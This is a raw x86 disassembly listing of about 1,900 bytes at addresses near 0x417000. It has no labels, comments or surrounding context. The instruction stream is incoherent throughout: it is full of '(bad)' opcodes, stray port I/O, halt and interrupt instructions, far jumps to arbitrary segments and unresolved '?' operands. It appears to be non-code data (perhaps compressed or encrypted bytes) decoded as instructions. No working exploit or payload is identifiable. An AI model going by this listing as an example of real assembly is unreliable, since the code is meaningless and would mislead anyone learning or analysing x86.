  416973:	inc    ebx
  416974:	pop    ds
  416975:	sahf   
  416976:	int3   
  416977:	int3   
  416978:	dec    ecx
  416979:	mov    dh,0x2e
  41697b:	xor    bh,BYTE PTR [esi]
  41697d:	xor    DWORD PTR [ecx-0x7bc71760],edi
  416983:	icebp  
  416984:	and    BYTE PTR [eax+0x554108e6],bl
  41698a:	pop    eax
  41698b:	shl    BYTE PTR [edi-0x70d11adb],0xf8
  416992:	mov    edx,DWORD PTR fs:[ebx+0x232c49a0]
  416999:	add    edx,ebx
  41699b:	fistp  QWORD PTR [edi+0x5a620a48]
  4169a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169a2:	adc    ch,bl
  4169a4:	in     al,0xe9
  4169a6:	in     eax,dx
  4169a7:	ror    DWORD PTR [edi],cl
  4169a9:	arpl   WORD PTR cs:[ebp+esi*2-0x7814b13b],cx
  4169b1:	arpl   WORD PTR [ecx],bx
  4169b3:	cdq    
  4169b4:	jecxz  0x41694d
  4169b6:	pop    ebx
  4169b7:	les    esi,FWORD PTR [ecx]
  4169b9:	test   DWORD PTR [edi+0x355e0d7d],esp
  4169bf:	mov    dh,0x6d
  4169c1:	cld    
  4169c2:	jmp    0x41695f
  4169c4:	adc    edx,DWORD PTR [esi-0x77]
  4169c7:	push   esi
  4169c8:	xlat   BYTE PTR ds:[ebx]
  4169c9:	ror    DWORD PTR [edx-0x6b9e523],1
  4169cf:	mov    ecx,0x82bf2c8b
  4169d4:	push   cs
  4169d5:	mov    dl,0x5e
  4169d7:	js     0x416a33
  4169d9:	je     0x416971
  4169db:	aad    0xba
  4169dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169de:	clc    
  4169df:	cmp    bh,0x2a
  4169e2:	sub    DWORD PTR [edi+esi*4],esp
  4169e5:	or     edi,DWORD PTR [eax]
  4169e7:	test   al,0x9c
  4169e9:	push   DWORD PTR [edx+ebx*8]
  4169ec:	leave  
  4169ed:	int3   
  4169ee:	leave  
  4169ef:	adc    al,0x34
  4169f1:	jmp    0x7693:0x2ddec14d
  4169f8:	into   
  4169f9:	sub    BYTE PTR [eax+0x3f9d5721],al
  4169ff:	cmp    al,0xa9
  416a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a02:	push   ss
  416a03:	and    DWORD PTR [edi+0x4f],esi
  416a06:	loope  0x4169fd
  416a08:	or     cl,dl
  416a0a:	(bad)  
  416a0b:	pop    ss
  416a0c:	sub    al,0xc5
  416a0e:	stc    
  416a0f:	add    DWORD PTR [ecx-0x58f5e79e],0x49
  416a16:	test   DWORD PTR [ebp-0x6c],ecx
  416a19:	jp     0x4169f0
  416a1b:	rcl    DWORD PTR [ebx-0x7f],cl
  416a1e:	push   edi
  416a1f:	mov    esp,0x6a402860
  416a24:	repz (bad) 
  416a26:	and    eax,DWORD PTR [edi]
  416a28:	(bad)  
  416a29:	mov    eax,0x515fcf6e
  416a2e:	xchg   ebp,eax
  416a2f:	(bad)  
  416a30:	ja     0x4169c1
  416a32:	pushf  
  416a33:	and    al,0xe8
  416a35:	shl    BYTE PTR [eax],0x23
  416a38:	mov    ss,esp
  416a3a:	ret    0x4552
  416a3d:	out    dx,al
  416a3e:	test   eax,0x9fccf929
  416a43:	xor    BYTE PTR [edx-0x10],0x68
  416a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a48:	mov    ch,0xb6
  416a4a:	fwait
  416a4b:	bnd jge 0x4169f8
  416a4e:	arpl   WORD PTR [eax+0x5],di
  416a51:	inc    eax
  416a52:	xor    eax,0x233e2ac
  416a57:	push   ds
  416a58:	ret    0x2cc3
  416a5b:	mov    cl,0xad
  416a5d:	shl    BYTE PTR [ecx-0x5eb3a78d],1
  416a63:	push   ds
  416a64:	mov    al,al
  416a66:	cli    
  416a67:	push   0xd640daca
  416a6c:	pusha  
  416a6d:	xor    BYTE PTR [esi-0x447ff555],al
  416a73:	idiv   BYTE PTR [ebx-0x71]
  416a76:	out    0x27,eax
  416a78:	shl    BYTE PTR [edi+edx*1-0x6d],cl
  416a7c:	clc    
  416a7d:	or     DWORD PTR [edx-0x2a7343a6],ebx
  416a83:	or     edi,edx
  416a85:	adc    ebx,DWORD PTR ds:0xd2d99603
  416a8b:	jne    0x416aef
  416a8d:	(bad)  
  416a8e:	dec    edi
  416a8f:	mov    es,WORD PTR [eax+0x4c]
  416a92:	imul   DWORD PTR [eax+0x75db3c3c]
  416a98:	mov    al,al
  416a9a:	push   ss
  416a9b:	(bad)  
  416a9d:	mov    al,0xa1
  416a9f:	inc    esp
  416aa0:	sub    esp,DWORD PTR [esi-0x42]
  416aa3:	xchg   esi,eax
  416aa4:	lods   al,BYTE PTR ds:[esi]
  416aa5:	pop    edx
  416aa6:	out    0x48,al
  416aa8:	sub    dl,BYTE PTR [ecx+edx*4]
  416aab:	imul   edi,DWORD PTR [edx+0x77],0x2b
  416aaf:	cmc    
  416ab0:	mov    ch,0xbc
  416ab2:	pusha  
  416ab3:	imul   ebp,DWORD PTR [eax+ebp*8+0x4a],0xffffffc0
  416ab8:	out    0x35,al
  416aba:	jns    0x416a55
  416abc:	mov    ch,BYTE PTR [ebp+0x6d]
  416abf:	fisttp DWORD PTR [eax-0x5f095cd9]
  416ac5:	mov    ch,0x98
  416ac7:	mov    eax,0x2fe422bd
  416acc:	pop    edx
  416acd:	sti    
  416ace:	dec    eax
  416acf:	mov    ss,WORD PTR [esi+ecx*2]
  416ad2:	sub    al,0xea
  416ad4:	inc    esi
  416ad5:	adc    esp,DWORD PTR [esi-0x2c8f59dd]
  416adb:	imul   esp,DWORD PTR [ecx-0x445c95a0],0xb2d7277a
  416ae5:	dec    ebx
  416ae6:	in     eax,dx
  416ae7:	mov    eax,ds:0xb0b504a4
  416aec:	adc    bh,bl
  416aee:	xor    eax,0x5d2a4b54
  416af3:	sbb    eax,0x7cfe6f8a
  416af8:	scas   eax,DWORD PTR es:[edi]
  416af9:	outs   dx,DWORD PTR ds:[esi]
  416afa:	rcr    BYTE PTR [esi+0x6fe09b84],1
  416b00:	xchg   edi,eax
  416b01:	inc    esi
  416b02:	cmp    eax,0xcb71ea61
  416b07:	ins    DWORD PTR es:[edi],dx
  416b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b09:	mov    ebx,0x1383a22d
  416b0e:	bound  esi,QWORD PTR [esi]
  416b10:	shl    BYTE PTR [eax+ecx*2-0x1f],1
  416b14:	scas   eax,DWORD PTR es:[edi]
  416b15:	push   esi
  416b16:	pop    edi
  416b17:	xchg   ah,cl
  416b19:	mov    al,ds:0xb8634542
  416b1e:	repz es or edx,ecx
  416b22:	add    ebp,DWORD PTR [ebx]
  416b24:	fdivr  QWORD PTR [edi+0x690cab3d]
  416b2a:	das    
  416b2b:	xor    dl,BYTE PTR [eax*1+0xe3af5]
  416b32:	aad    0x30
  416b34:	test   BYTE PTR [ebx+0x472da088],dl
  416b3a:	repz ja 0x416ba6
  416b3d:	fadd   DWORD PTR [edx+eax*4+0x4b311033]
  416b44:	outs   dx,DWORD PTR ds:[esi]
  416b45:	and    bl,BYTE PTR [esi-0x57dfbdc3]
  416b4b:	ins    BYTE PTR es:[edi],dx
  416b4c:	scas   eax,DWORD PTR es:[edi]
  416b4d:	mov    bh,BYTE PTR [edx+0x3a09680c]
  416b53:	xor    bl,BYTE PTR [ecx]
  416b55:	xor    DWORD PTR [ecx+0x54],esp
  416b58:	jge    0x416b49
  416b5a:	push   es
  416b5b:	add    al,0x4c
  416b5d:	push   eax
  416b5e:	lods   al,BYTE PTR ds:[esi]
  416b5f:	jo     0x416aef
  416b61:	lds    ecx,FWORD PTR [esi-0x68fe5c8a]
  416b67:	jl     0x416aea
  416b69:	jge    0x416bd4
  416b6b:	enter  0xe9b5,0xcb
  416b6f:	les    esi,FWORD PTR [edx]
  416b71:	add    al,BYTE PTR [edi]
  416b73:	ins    BYTE PTR es:[edi],dx
  416b74:	mov    edi,0xc2c20a35
  416b79:	jae    0x416bc0
  416b7b:	pop    ss
  416b7c:	popa   
  416b7d:	ret    
  416b7e:	stc    
  416b7f:	add    al,0xd4
  416b81:	cli    
  416b82:	les    ecx,FWORD PTR [esi]
  416b84:	into   
  416b85:	ss scas al,BYTE PTR es:[edi]
  416b87:	adc    esp,0x9b7dc836
  416b8d:	daa    
  416b8e:	hlt    
  416b8f:	inc    ebp
  416b90:	xor    DWORD PTR [ebx+0x3ea09313],esp
  416b96:	or     eax,0xe82413a5
  416b9b:	loope  0x416b47
  416b9d:	inc    edi
  416b9e:	loope  0x416b3a
  416ba0:	pop    ebx
  416ba1:	fs dec ebx
  416ba3:	inc    eax
  416ba4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416ba6:	fldenv [edx]
  416ba8:	mov    DWORD PTR [esi],edx
  416baa:	mov    al,0x2d
  416bac:	rol    DWORD PTR [ecx-0x62b25132],0xdf
  416bb3:	sbb    DWORD PTR [edx+edi*4],ebx
  416bb6:	popf   
  416bb7:	jg     0x416b9f
  416bb9:	and    eax,0xcca9a182
  416bbe:	das    
  416bbf:	or     al,al
  416bc1:	dec    esp
  416bc2:	mov    bl,0x26
  416bc4:	mov    bl,0x7c
  416bc6:	sub    DWORD PTR [edi+0x77],edi
  416bc9:	or     al,bl
  416bcb:	pusha  
  416bcc:	xchg   esp,eax
  416bcd:	icebp  
  416bce:	or     al,0xb8
  416bd0:	test   ebp,ebx
  416bd2:	fs and edi,eax
  416bd5:	jnp    0x416c17
  416bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd8:	popa   
  416bd9:	fst    DWORD PTR [ecx]
  416bdb:	je     0x416b96
  416bdd:	inc    edi
  416bde:	out    dx,eax
  416bdf:	ret    0x612f
  416be2:	pop    es
  416be3:	mov    al,gs:0x84e6d32
  416be9:	add    eax,0x40190576
  416bee:	lahf   
  416bef:	and    ah,BYTE PTR [ebp+0x8]
  416bf2:	ficomp DWORD PTR [ecx+0x4e6531ab]
  416bf8:	and    eax,0x13343849
  416bfd:	adc    al,0xea
  416bff:	clc    
  416c00:	cmp    dh,cl
  416c02:	lds    eax,FWORD PTR [esp+eiz*8-0x5e0daec]
  416c09:	sub    DWORD PTR [edx],esp
  416c0b:	add    ebp,edi
  416c0d:	xchg   ebp,eax
  416c0e:	stos   BYTE PTR es:[edi],al
  416c0f:	popa   
  416c10:	inc    esi
  416c11:	xor    eax,DWORD PTR [edx-0x5061a3fa]
  416c17:	sbb    BYTE PTR [ebx],bh
  416c19:	sbb    edi,DWORD PTR [ecx-0x44e91f44]
  416c1f:	push   0x36
  416c21:	xor    bl,BYTE PTR [edx+0x12175ac9]
  416c27:	lods   al,BYTE PTR ds:[esi]
  416c28:	icebp  
  416c29:	scas   al,BYTE PTR es:[edi]
  416c2a:	mov    bl,0x4a
  416c2c:	or     edi,DWORD PTR [eax-0x21]
  416c2f:	idiv   DWORD PTR ds:0x6b1a3197
  416c35:	(bad)  
  416c37:	imul   esp,DWORD PTR [ecx+0x16ffcbe7],0x4ca1b331
  416c41:	es push ds
  416c43:	jb     0x416bf0
  416c45:	aas    
  416c46:	js     0x416bcd
  416c48:	bound  ebp,QWORD PTR [edx+0x261667b8]
  416c4e:	mov    ecx,0x1bf42f7d
  416c53:	lds    esp,FWORD PTR ds:0x212fd75a
  416c59:	cmp    DWORD PTR [edi+0x6dc025b3],ecx
  416c5f:	fild   DWORD PTR ds:0x3e326407
  416c65:	mov    WORD PTR [esi+0x3f8e2079],ss
  416c6b:	in     eax,0xea
  416c6d:	adc    dh,BYTE PTR [ecx+0x7f]
  416c70:	mov    WORD PTR [ebx-0x4c776028],?
  416c76:	jg     0x416c1e
  416c78:	popa   
  416c79:	mov    bl,0xd5
  416c7b:	fwait
  416c7c:	push   edi
  416c7d:	dec    ebx
  416c7e:	inc    ebp
  416c7f:	dec    esp
  416c80:	mov    al,bh
  416c82:	xor    cl,BYTE PTR [ebp-0x1498a3cc]
  416c88:	pop    edx
  416c89:	inc    eax
  416c8a:	xchg   edi,eax
  416c8b:	mov    edi,0xfa70e58d
  416c90:	pop    ss
  416c91:	inc    ebp
  416c92:	idiv   BYTE PTR [esi]
  416c94:	fsubr  st(5),st
  416c96:	push   edx
  416c97:	xchg   ebx,eax
  416c98:	js     0x416cb9
  416c9a:	je     0x416cd2
  416c9c:	clc    
  416c9d:	cmp    eax,0x5e6652c6
  416ca2:	lods   al,BYTE PTR ds:[esi]
  416ca3:	les    esi,FWORD PTR [ebx-0x23]
  416ca6:	jb     0x416c9e
  416ca8:	cmp    cl,cl
  416caa:	mov    eax,0x9d325ae6
  416caf:	xchg   DWORD PTR [ecx],eax
  416cb1:	jo     0x416c4f
  416cb3:	inc    esp
  416cb4:	daa    
  416cb5:	lods   eax,DWORD PTR ds:[esi]
  416cb6:	aam    0x7c
  416cb8:	mov    DWORD PTR [ecx],ebx
  416cba:	dec    ebx
  416cbb:	push   edx
  416cbc:	jmp    0xd31:0x6eae2572
  416cc3:	call   0x2bf0:0xa496fb56
  416cca:	and    bh,ch
  416ccc:	in     eax,dx
  416ccd:	inc    eax
  416cce:	pushf  
  416ccf:	jno    0x416c9f
  416cd1:	inc    ebp
  416cd2:	add    eax,0x9e467b49
  416cd7:	out    0xb1,al
  416cd9:	jge    0x416cd7
  416cdb:	mov    ecx,0xadeea19c
  416ce0:	push   esi
  416ce1:	adc    eax,0x5265c0b7
  416ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce7:	or     eax,0xb583ffdd
  416cec:	mov    dh,0x4e
  416cee:	loop   0x416d16
  416cf0:	adc    bh,bl
  416cf2:	out    dx,eax
  416cf3:	inc    esi
  416cf4:	hlt    
  416cf5:	fwait
  416cf6:	push   ebp
  416cf7:	adc    BYTE PTR [eax-0x7e203649],cl
  416cfd:	daa    
  416cfe:	aas    
  416cff:	dec    esi
  416d00:	sbb    cl,BYTE PTR [ecx-0x60]
  416d03:	jo     0x416d00
  416d05:	mov    ebp,0xcc2e9513
  416d0a:	jmp    DWORD PTR [ebx+0xbbd4a30]
  416d10:	mov    esp,0x48640dab
  416d15:	cmc    
  416d16:	shl    cl,1
  416d18:	inc    edx
  416d19:	out    0xb2,eax
  416d1b:	jb     0x416d6d
  416d1d:	sub    BYTE PTR [edi],al
  416d1f:	sbb    dl,cl
  416d21:	add    BYTE PTR [edx-0x793a1beb],dh
  416d27:	mov    es,WORD PTR [ebp-0x180ce11a]
  416d2d:	mov    ss:0x494a9e35,al
  416d33:	lods   al,BYTE PTR ds:[esi]
  416d34:	xchg   DWORD PTR [eax+0x49],esi
  416d37:	das    
  416d38:	xor    DWORD PTR [ecx-0xdebcdca],ebp
  416d3e:	mov    ds:0x9af638c0,eax
  416d43:	xor    BYTE PTR [edi],ch
  416d45:	add    DWORD PTR [eax-0x7a5851c1],edi
  416d4b:	adc    DWORD PTR [edi+ebp*1+0x43cd52fc],esi
  416d52:	mov    ds:0x1793562b,eax
  416d58:	cld    
  416d59:	add    DWORD PTR [eax],0xf2acc4bb
  416d5f:	inc    eax
  416d60:	cmp    al,0xc
  416d62:	mov    ebp,0x9386d258
  416d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d68:	std    
  416d69:	aaa    
  416d6a:	xchg   esi,eax
  416d6b:	mov    WORD PTR [ebx+ecx*4],?
  416d6e:	dec    ebp
  416d6f:	fucom  st(7)
  416d71:	imul   ebp,DWORD PTR cs:[ecx],0xf4ced0b7
  416d78:	sbb    DWORD PTR [edi-0x34],edx
  416d7b:	xchg   esp,eax
  416d7c:	mov    bl,cl
  416d7e:	(bad)  
  416d7f:	(bad)  
  416d80:	call   0x71d44aad
  416d85:	aaa    
  416d86:	push   0x9e1dd18b
  416d8b:	addr16 cmc 
  416d8d:	into   
  416d8e:	xchg   DWORD PTR [edi],edx
  416d90:	xchg   edx,eax
  416d91:	jge    0x416d43
  416d93:	hlt    
  416d94:	mov    BYTE PTR [ebx],bl
  416d96:	sbb    eax,0x14fff209
  416d9b:	das    
  416d9c:	inc    esp
  416d9d:	xchg   BYTE PTR ds:0x74173181,al
  416da3:	xchg   edx,eax
  416da4:	push   eax
  416da5:	fcmove st,st(2)
  416da7:	cdq    
  416da8:	dec    ecx
  416da9:	call   0x3ee0ab18
  416dae:	pop    edi
  416daf:	xchg   dh,ah
  416db1:	xor    esp,DWORD PTR [eax-0x1]
  416db4:	push   es
  416db5:	sub    ch,0x67
  416db8:	sub    ebx,0x7e
  416dbb:	add    eax,0x39065305
  416dc0:	pop    ebx
  416dc1:	(bad)  
  416dc3:	sbb    ecx,ecx
  416dc5:	jmp    0xde1d701e
  416dca:	adc    DWORD PTR [esi],esi
  416dcc:	push   eax
  416dcd:	mov    BYTE PTR [esi],ch
  416dcf:	inc    edx
  416dd0:	pop    ebx
  416dd1:	cmp    ch,BYTE PTR [ecx]
  416dd3:	mov    fs,WORD PTR [esi+edx*1-0x63]
  416dd7:	and    eax,esp
  416dd9:	xor    BYTE PTR [eax+0x5d],0xdb
  416ddd:	mov    edi,0x7cca7a48
  416de2:	mov    DWORD PTR [ebx+0x59],edx
  416de5:	mov    ds:0x257ed7ea,al
  416dea:	pop    esp
  416deb:	add    al,0xe
  416ded:	(bad)  
  416dee:	mov    cl,0x2a
  416df0:	cmp    al,BYTE PTR [esi+eax*8+0x47]
  416df4:	xchg   esp,eax
  416df5:	ret    
  416df6:	out    0x95,eax
  416df8:	stc    
  416df9:	leave  
  416dfa:	mov    edi,0x9fcd364b
  416dff:	jmp    0x416dbd
  416e01:	mov    DWORD PTR [ebp+eax*1+0x21],0xd72ff505
  416e09:	leave  
  416e0a:	imul   ecx,DWORD PTR [edx+edx*4],0xffffffe3
  416e0e:	pop    ebp
  416e0f:	inc    ebx
  416e10:	lods   al,BYTE PTR ds:[esi]
  416e11:	gs cmc 
  416e13:	jl     0x416e69
  416e15:	stos   DWORD PTR es:[edi],eax
  416e16:	push   eax
  416e17:	shr    BYTE PTR [ecx-0x3e],cl
  416e1a:	pop    esi
  416e1b:	mov    ch,BYTE PTR [esi-0x5e82c802]
  416e21:	enter  0xac9c,0xf
  416e25:	out    dx,eax
  416e26:	mov    ?,WORD PTR [ecx-0x1a]
  416e29:	enter  0x5d78,0x2e
  416e2d:	sub    BYTE PTR [edi+0x26],0xe5
  416e31:	ja     0x416eae
  416e33:	stos   BYTE PTR es:[edi],al
  416e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e35:	(bad)  
  416e36:	pushf  
  416e37:	(bad)  
  416e38:	fstp   QWORD PTR [ebp-0x655702b3]
  416e3e:	jg     0x416de8
  416e40:	dec    esi
  416e41:	inc    esi
  416e42:	add    eax,0x9134b0f2
  416e47:	dec    DWORD PTR [edx+0x3d3dae4c]
  416e4d:	xor    eax,0xa0f7b5bb
  416e52:	leave  
  416e53:	sbb    al,0xdf
  416e55:	out    dx,al
  416e56:	stos   DWORD PTR es:[edi],eax
  416e57:	dec    esi
  416e58:	fstp   DWORD PTR [eax]
  416e5a:	jo     0x416df5
  416e5c:	and    ebp,DWORD PTR [ebx+esi*1]
  416e5f:	pusha  
  416e60:	push   ebp
  416e61:	popf   
  416e62:	add    BYTE PTR [edi-0x563b8524],dh
  416e68:	scas   al,BYTE PTR es:[edi]
  416e69:	mov    ch,0xfa
  416e6b:	cmc    
  416e6c:	fnstenv [ebx-0x6a4dee82]
  416e72:	ins    DWORD PTR es:[edi],dx
  416e73:	sar    ch,0x9a
  416e76:	mov    al,ds:0x1fb6bba
  416e7b:	in     eax,0x30
  416e7d:	(bad)  
  416e7e:	cld    
  416e7f:	xor    dl,BYTE PTR [esi+0x59]
  416e82:	cmp    edx,esi
  416e84:	push   ecx
  416e85:	(bad)  
  416e86:	fisttp WORD PTR [esi+0x5a]
  416e89:	int    0xe2
  416e8b:	addr16 mov bh,0x8f
  416e8e:	clc    
  416e8f:	imul   esi,DWORD PTR [edi],0xec2a29c
  416e95:	jns    0x416f06
  416e97:	pop    ebp
  416e98:	xchg   esp,eax
  416e99:	imul   esp,DWORD PTR [edx],0x3e
  416e9c:	in     al,dx
  416e9d:	mov    fs,WORD PTR [edi+0x3de9c0ee]
  416ea3:	and    al,BYTE PTR [ecx]
  416ea5:	or     al,cl
  416ea7:	xchg   ebp,eax
  416ea8:	fadd   DWORD PTR [ecx+0x5]
  416eab:	cmp    ecx,esi
  416ead:	pop    ebp
  416eae:	(bad)  [ecx+0x795ca2d3]
  416eb4:	stos   DWORD PTR es:[edi],eax
  416eb5:	les    edx,FWORD PTR [ecx+edi*8]
  416eb8:	mov    cl,0x60
  416eba:	jb     0x416f0d
  416ebc:	test   DWORD PTR [ecx-0x4f],esp
  416ebf:	jmp    0x63f7dbb1
  416ec4:	shl    BYTE PTR [ebx+0x356022a0],0x13
  416ecb:	mov    fs,WORD PTR [ebp+eax*4+0x7f4a6d10]
  416ed2:	imul   esp
  416ed4:	adc    eax,0xaf8fb99
  416ed9:	(bad)  
  416eda:	or     DWORD PTR [ebp-0x3a],esi
  416edd:	mov    edx,0x21ce2d1c
  416ee2:	dec    edi
  416ee3:	adc    eax,0x6b653d47
  416ee8:	fist   WORD PTR [ecx-0x5bd95c8e]
  416eee:	into   
  416eef:	dec    edx
  416ef0:	call   0x45a6:0xfe834cf9
  416ef7:	fsub   DWORD PTR [ebp-0x19a24a73]
  416efd:	dec    eax
  416efe:	call   0x6053ff70
  416f03:	xchg   esi,eax
  416f04:	jl     0x416f54
  416f06:	push   esp
  416f07:	adc    BYTE PTR [ebx-0x51],ch
  416f0a:	sub    ebp,ecx
  416f0c:	repz cmp eax,DWORD PTR [esi]
  416f0f:	jbe    0x416f0d
  416f11:	and    BYTE PTR [edi-0x37],bh
  416f14:	test   DWORD PTR [eax-0x10],0x522c551e
  416f1b:	pop    esi
  416f1c:	repnz repz icebp 
  416f1f:	add    BYTE PTR [ecx+0x22],0x53
  416f23:	int    0xa4
  416f25:	jnp    0x416ede
  416f27:	(bad)  
  416f28:	hlt    
  416f29:	and    al,0xd9
  416f2b:	sub    eax,0xa2577c4c
  416f30:	pop    ss
  416f31:	cdq    
  416f32:	jmp    FWORD PTR [ebx-0x70]
  416f35:	xchg   ebx,eax
  416f36:	mov    ebp,0xa10fa34d
  416f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f3c:	fimul  DWORD PTR [esp+eiz*8]
  416f3f:	xor    DWORD PTR [ebp-0x7f2f77d3],ecx
  416f45:	das    
  416f46:	aaa    
  416f47:	pop    ds
  416f48:	lds    esp,FWORD PTR [esp+ebp*4]
  416f4b:	xor    cl,BYTE PTR [edi+0x20]
  416f4e:	ret    
  416f4f:	xchg   DWORD PTR [esi],esp
  416f51:	dec    edi
  416f52:	int3   
  416f53:	mov    esp,0x8ec960d8
  416f58:	jae    0x416f40
  416f5a:	in     eax,0x2b
  416f5c:	add    BYTE PTR [eax+0x64535fe2],0xd7
  416f63:	jge    0x416f6a
  416f65:	adc    ah,BYTE PTR [esi]
  416f67:	pop    edi
  416f68:	dec    ebp
  416f69:	jbe    0x416f92
  416f6b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6d:	dec    esp
  416f6e:	fwait
  416f6f:	ins    BYTE PTR es:[edi],dx
  416f70:	in     eax,dx
  416f71:	push   esi
  416f72:	ds dec ecx
  416f74:	or     DWORD PTR [esi+0x4d],edx
  416f77:	arpl   WORD PTR [ecx+edi*2-0x7d],bp
  416f7b:	xchg   ebx,eax
  416f7c:	cmp    eax,0xf9ba3de8
  416f81:	mov    edi,DWORD PTR [esi]
  416f83:	rcr    edx,1
  416f85:	mov    ecx,0x61683462
  416f8a:	fcomp  QWORD PTR [ebp+0x1bc69619]
  416f90:	rol    DWORD PTR [edi+ecx*8-0x7a1bf688],cl
  416f97:	pop    ds
  416f98:	fidivr DWORD PTR [esi+ebp*4]
  416f9b:	lahf   
  416f9c:	fdivr  DWORD PTR [esi]
  416f9e:	jl     0x416fc2
  416fa0:	ret    0xeb26
  416fa3:	and    BYTE PTR [eax],dl
  416fa5:	dec    eax
  416fa6:	push   eax
  416fa7:	mov    edx,0x14a075af
  416fac:	out    dx,al
  416fad:	sbb    ecx,DWORD PTR [ebx+esi*8+0x11467a1c]
  416fb4:	hlt    
  416fb5:	xchg   ebx,eax
  416fb6:	gs push eax
  416fb8:	shl    BYTE PTR [edi],1
  416fba:	push   ds
  416fbb:	jge    0x417018
  416fbd:	outs   dx,BYTE PTR ds:[esi]
  416fbe:	mov    eax,0x8849526a
  416fc3:	jmp    0xe4a0ab3
  416fc8:	inc    esp
  416fc9:	mov    al,ds:0xae11b4a2
  416fce:	pop    ebx
  416fcf:	fistp  WORD PTR [edi-0x432af25c]
  416fd5:	icebp  
  416fd6:	arpl   sp,bp
  416fd8:	dec    eax
  416fd9:	inc    edx
  416fda:	(bad)
  416fdd:	or     dh,BYTE PTR [edx]
  416fdf:	out    0x2a,eax
  416fe1:	mov    bl,0x1e
  416fe3:	adc    DWORD PTR [edx-0x4e],eax
  416fe6:	mov    WORD PTR [esi],ds
  416fe8:	xchg   BYTE PTR [edx+edi*1+0x4],bl
  416fec:	je     0x416fde
  416fee:	lea    esi,ss:[ecx-0x1b86fc18]
  416ff5:	test   BYTE PTR [ebp+0x22],0x34
  416ff9:	icebp  
  416ffa:	gs ret 0x3ddb
  416ffe:	(bad)  
  416fff:	xchg   ebx,eax
  417000:	push   cs
  417001:	test   DWORD PTR [ecx+edi*8-0x1e],ebp
  417005:	mov    esp,DWORD PTR [ecx+0x62]
  417008:	lock cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  41700b:	ja     0x417056
  41700d:	mov    ds:0x6a9cae7,al
  417012:	rcl    BYTE PTR [esi-0x6c],1
  417015:	rol    DWORD PTR [eax+0x63],0x59
  417019:	adc    bh,BYTE PTR [edi+0x2a24f33c]
  41701f:	or     al,BYTE PTR [ebp+0x79]
  417022:	jl     0x417077
  417024:	push   0xffffffbe
  417026:	loop   0x417089
  417028:	jmp    WORD PTR [esi+0x74]
  41702c:	pop    ebx
  41702d:	bound  edx,QWORD PTR [ecx+0xb]
  417030:	push   esi
  417031:	leave  
  417032:	ja     0x417081
  417034:	dec    esi
  417035:	xor    bh,BYTE PTR [edi+edx*8]
  417038:	inc    eax
  417039:	jl     0x41705c
  41703b:	ins    DWORD PTR es:[edi],dx
  41703c:	test   eax,0x1a4844e4
  417041:	jmp    0x417010
  417043:	sub    ecx,DWORD PTR [ecx-0x372acdba]
  417049:	daa    
  41704a:	dec    ebp
  41704b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41704c:	or     BYTE PTR [ebx],bl
  41704e:	sub    DWORD PTR [edi+0x17],esi
  417051:	cmp    DWORD PTR [edx-0x5fd863d1],eax
  417057:	and    BYTE PTR [edx-0x15325855],ch
  41705d:	and    eax,0x99509ac2
  417062:	push   0x9086158c
  417067:	pushf  
  417068:	out    0xe0,eax
  41706a:	jne    0x416ffe
  41706c:	(bad)  
  41706d:	sub    eax,0xd033bcc7
  417072:	lahf   
  417073:	cmp    al,BYTE PTR [edi+ebp*8+0x5d63c3f]
  41707a:	add    BYTE PTR [edx+0x17],ch
  41707d:	out    dx,al
  41707e:	sbb    edi,DWORD PTR [ebp-0x5]
  417081:	xchg   ecx,eax
  417082:	xor    eax,0x6c3d8094
  417087:	stos   DWORD PTR es:[edi],eax
  417088:	sbb    bl,BYTE PTR [ecx-0x27d409fa]
  41708e:	cdq    
  41708f:	fcom   DWORD PTR [edx]
  417091:	les    ebx,FWORD PTR [ebx-0x3de319d9]
  417097:	mov    bl,0x9
  417099:	inc    ebp
  41709a:	daa    
  41709b:	scas   al,BYTE PTR es:[edi]
  41709c:	fmul   DWORD PTR [edi]
  41709e:	push   0xc53ee1ae
  4170a3:	pop    ebp
  4170a4:	or     DWORD PTR ds:[bp+si+0x0],ebx
  4170a9:	hlt    
  4170aa:	sub    DWORD PTR [esi],ecx
  4170ac:	push   es
  4170ad:	push   ebx
  4170ae:	imul   ebx,DWORD PTR [ebp+0x1c],0xffffff80
  4170b2:	mov    al,ds:0x19110718
  4170b7:	add    BYTE PTR [ecx-0x133a6a7f],cl
  4170bd:	(bad)  
  4170be:	xor    ch,BYTE PTR [esi-0x23]
  4170c1:	push   ds
  4170c2:	add    eax,DWORD PTR [eax+0x13]
  4170c5:	aaa    
  4170c6:	and    dh,bl
  4170c8:	fidiv  WORD PTR [edx+0x114331e5]
  4170ce:	mov    WORD PTR fs:[eax],cs
  4170d1:	fwait
  4170d2:	call   0x3654:0xed324843
  4170d9:	push   edi
  4170da:	sbb    eax,0x2e7cc5e5
  4170df:	push   0x2b937b33
  4170e4:	mov    ?,WORD PTR [esi-0x74d49b12]
  4170ea:	call   0xf818e674
  4170ef:	xor    DWORD PTR [ecx-0xc4abcc7],edx
  4170f5:	popa   
  4170f6:	loop   0x417177
  4170f8:	push   ss
  4170f9:	pop    ds
  4170fa:	push   esi
  4170fb:	dec    esp
  4170fc:	mov    ah,0xe6
  4170fe:	iret   
  4170ff:	mov    bl,0xe3
  417101:	in     eax,0x8e
  417103:	(bad)  
  417105:	push   0xffffffe4
  417107:	xchg   DWORD PTR [edi+esi*8],ebp
  41710a:	xchg   edx,eax
  41710b:	in     eax,dx
  41710c:	arpl   WORD PTR [ecx],dx
  41710e:	(bad)  
  41710f:	iret   
  417110:	inc    edi
  417111:	dec    edx
  417112:	mov    ebp,0xd639e760
  417117:	pop    ecx
  417118:	adc    ch,dl
  41711a:	and    DWORD PTR [edi-0x2d],edi
  41711d:	mov    ah,0xcc
  41711f:	mov    edi,edx
